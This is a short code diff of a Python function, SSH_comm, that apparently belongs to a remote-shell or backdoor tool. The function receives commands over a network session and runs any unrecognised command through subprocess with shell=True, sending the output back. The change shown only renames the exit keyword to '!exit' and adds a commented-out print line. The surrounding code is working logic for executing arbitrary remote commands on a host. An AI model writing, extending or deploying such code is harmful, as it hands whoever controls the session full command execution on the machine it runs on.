@@ -47,7 +47,7 @@ def SSH_comm():
                 command = session.recv(1024).decode()
                 head = command.split(" ")[0]
                 match head:
-                    case "exit":
+                    case "!exit":
                         sys.exit()
                     case "cd":
                         path = " ".join(command.split(" ")[1:])
@@ -55,6 +55,7 @@ def SSH_comm():
                         CWD = os.getcwd()
                         session.sendall(f"Changed directory to {CWD}\n")
                     case _:
+                        #print(command.split(" ")[1:])
                         output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
                         if (len(output) == 0):
                             session.sendall("[*] Command executed. No shell output.\n")
